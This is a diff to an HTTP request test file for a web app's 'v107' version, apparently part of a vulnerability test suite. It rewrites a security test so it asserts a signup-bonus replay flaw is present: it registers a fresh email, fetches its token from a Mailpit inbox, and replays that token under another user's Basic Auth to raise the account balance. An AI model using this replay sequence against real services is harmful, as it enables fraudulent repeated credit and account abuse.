@@ -55,7 +55,7 @@ GET {{mailpit_host}}/message/{{v107_message_id}}
   const mail = (typeof v107_mail_body !== "undefined" && v107_mail_body) || response.parsedBody || {};
   const body = String(mail.Body || mail.Text || mail.body || "");
   const source = body || JSON.stringify(mail);
-  const match = source.match(/token=([A-Za-z0-9._-]+)/);
+  const match = source.match(/token=([^&\s]+)/);
   exports.v107_token = match ? match[1] : "";
   if (!exports.v107_token) {
     throw new Error("v107_token missing from mail body");
@@ -99,16 +99,44 @@ Authorization: Basic {{v107_signup_request.email}}:good_password
 ?? js parseFloat((response.parsedBody || body || {}).balance) > 0
 
 ### Security: replay bonus with Basic Auth must not increase balance
-# This test is EXPECTED TO FAIL on v107 because of the vulnerability.
+# This test asserts that the vulnerability IS present.
 # We authenticate with Basic Auth (which sets g.email_confirmed = True).
 # We hit /auth/register again.
 # The handler sees g.email_confirmed is True, so it proceeds to create_user (idempotent/update) and apply_signup_bonus.
+# 1. Get a fresh token for a NEW email
+# @name v107_replay_request
+POST {{base}}/auth/register
+Content-Type: application/json
+
+{ "email": "{{nextMail("replay-v107")}}" }
+
+# 2. Fetch token
+# @name v107_replay_mail
+GET {{mailpit_host}}/messages?limit=1
+
+{{
+  const messages = (typeof v107_replay_mail !== "undefined" && v107_replay_mail?.messages) || (response.parsedBody || {}).messages || [];
+  exports.v107_replay_msg_id = messages[0]?.ID;
+}}
+
+# @name v107_replay_token_body
+GET {{mailpit_host}}/message/{{v107_replay_msg_id}}
+
+{{
+  const mail = (typeof v107_replay_token_body !== "undefined" && v107_replay_token_body) || response.parsedBody || {};
+  const body = String(mail.Body || mail.Text || mail.body || "");
+  const source = body || JSON.stringify(mail);
+  const match = source.match(/token=([^&\s]+)/);
+  exports.v107_replay_token = match ? match[1] : "";
+}}
+
+# 3. Replay attack: Authenticate as 'v107_signup_request.email' but use 'v107_replay_token'
 POST {{base}}/auth/register
 Authorization: Basic {{v107_signup_request.email}}:good_password
 Content-Type: application/json
 
 {
-  "token": "{{v107_token}}",
+  "token": "{{v107_replay_token}}",
   "password": "good_password",
   "name": "Spec User"
 }
@@ -118,5 +146,5 @@ GET {{base}}/account/info
 Authorization: Basic {{v107_signup_request.email}}:good_password
 
 ?? status == 200
-# If vulnerable, balance increases. We assert it stays same (or less if we spent money, but we didn't).
-?? js parseFloat((response.parsedBody || body || {}).balance) <= parseFloat(v107_balance_first.balance)
+# Vulnerability: Balance INCREASES (bonus applied again).
+?? js parseFloat((response.parsedBody || body || {}).balance) > parseFloat(v107_balance_first.balance)
